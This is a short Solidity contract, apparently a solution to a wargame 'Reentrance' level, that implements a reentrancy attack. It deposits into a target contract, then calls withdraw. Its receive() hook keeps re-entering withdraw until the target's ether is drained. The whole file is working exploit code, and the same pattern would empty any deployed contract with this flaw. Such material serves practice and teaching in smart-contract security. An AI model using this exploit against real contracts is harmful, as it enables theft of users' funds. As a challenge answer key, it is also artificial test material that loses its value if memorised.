// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/Reentrance/Reentrance.sol";

contract ReentranceAttack {
    Reentrance target;

    constructor(address payable _target) public {
        target = Reentrance(_target);
    }

    function donate() external payable {
        target.donate{value: msg.value}(address(this));
    }

    function attack() external {
        target.withdraw(target.balanceOf(address(this)));
    }

    receive() external payable {
        require(msg.sender == address(target), "Invalid sender");

        uint256 targetBal = address(target).balance;
        uint256 attackerBal = target.balanceOf(address(this));

        if (targetBal == 0) return;
        if (attackerBal < targetBal) {
            target.withdraw(attackerBal);
        } else {
            target.withdraw(targetBal);
        }
    }
}
